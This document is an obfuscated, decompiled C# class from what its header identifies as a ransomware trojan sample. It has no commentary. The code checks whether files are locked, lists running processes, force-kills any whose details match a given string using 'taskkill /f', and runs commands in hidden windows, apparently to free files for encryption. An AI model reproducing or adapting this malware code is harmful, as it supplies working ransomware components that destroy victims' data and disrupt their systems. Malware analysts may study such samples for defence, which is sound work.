// Decompiled with JetBrains decompiler
// Type: coxZRmDhvSAWo.uruahRFIszrntX
// Assembly: Worker-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E50A6D0-CF23-40BF-9617-750EB84D00C0
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-122df846a943e419c3a31f65b6e67e7570134612b2dfd45638e0edd23e214036.exe

using SmartAssembly.Delegates;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace coxZRmDhvSAWo
{
  internal sealed class uruahRFIszrntX
  {
    public static readonly List<string> PhfXHkYkdlt;
    public static readonly List<string> lvaSJtFfhAkW;
    private static Func<string, string[]> f000045;
    private static Func<string[], string> f000046;
    [NonSerialized]
    internal static GetString f000047;

    public static bool bURwEzWcMZKaoi(string p0)
    {
      FileStream fileStream = (FileStream) null;
      bool flag;
      try
      {
        fileStream = File.Open(p0, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
      }
      catch (UnauthorizedAccessException ex1)
      {
        try
        {
          fileStream = File.Open(p0, FileMode.Open, FileAccess.Read, FileShare.None);
        }
        catch (Exception ex2)
        {
          flag = true;
          goto label_8;
        }
      }
      catch (Exception ex)
      {
        flag = true;
        goto label_8;
      }
      finally
      {
        fileStream.Close();
      }
      flag = false;
label_8:
      return flag;
    }

    public static void BBxxokkeNIlNHfR(string p0)
    {
      Func<string, bool> func = (Func<string, bool>) null;
      uruahRFIszrntX.c00000e c00000e = new uruahRFIszrntX.c00000e();
      c00000e.ucwCcyKSkisvF = p0;
      try
      {
        string[] source1 = uruahRFIszrntX.AfzJKSPfwyBdcv("tasklist", "/v /fo csv").Split(new string[1]
        {
          "\r\n"
        }, StringSplitOptions.None);
        if (func == null)
          func = new Func<string, bool>(c00000e.m000021);
        Func<string, bool> predicate = func;
        IEnumerable<string> source2 = ((IEnumerable<string>) source1).Where<string>(predicate);
        if (uruahRFIszrntX.f000045 == null)
          uruahRFIszrntX.f000045 = new Func<string, string[]>(uruahRFIszrntX.m00001f);
        Func<string, string[]> f000045 = uruahRFIszrntX.f000045;
        IEnumerable<string[]> source3 = source2.Select<string, string[]>(f000045);
        if (uruahRFIszrntX.f000046 == null)
          uruahRFIszrntX.f000046 = new Func<string[], string>(uruahRFIszrntX.m000020);
        Func<string[], string> f000046 = uruahRFIszrntX.f000046;
        foreach (string str in source3.Select<string[], string>(f000046).ToList<string>())
          uruahRFIszrntX.AfzJKSPfwyBdcv("taskkill", "/f /pid " + str);
      }
      catch (Exception ex)
      {
      }
    }

    public static string AfzJKSPfwyBdcv(string p0, string p1)
    {
      string str;
      try
      {
        Process process = Process.Start(new ProcessStartInfo(p0, p1)
        {
          RedirectStandardOutput = true,
          RedirectStandardError = true,
          StandardOutputEncoding = Encoding.GetEncoding("UTF-8"),
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = false,
          CreateNoWindow = true
        });
        string end1;
        using (StreamReader standardOutput = process.StandardOutput)
          end1 = standardOutput.ReadToEnd();
        string end2;
        using (StreamReader standardError = process.StandardError)
          end2 = standardError.ReadToEnd();
        process.WaitForExit();
        str = end2 + end1;
      }
      catch (Exception ex)
      {
        str = ex.Message + "\n<------------>\n" + ex.StackTrace;
      }
      return str;
    }

    private static string[] m00001f(string p0) => p0.Split(',');

    private static string m000020(string[] p0) => p0[1].Replace("\"", "");

    static uruahRFIszrntX()
    {
      SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (uruahRFIszrntX));
      uruahRFIszrntX.PhfXHkYkdlt = new List<string>();
      uruahRFIszrntX.lvaSJtFfhAkW = new List<string>();
    }

    private sealed class c00000e
    {
      public string ucwCcyKSkisvF;

      public bool m000021(string p0) => p0.Contains(this.ucwCcyKSkisvF);
    }
  }
}
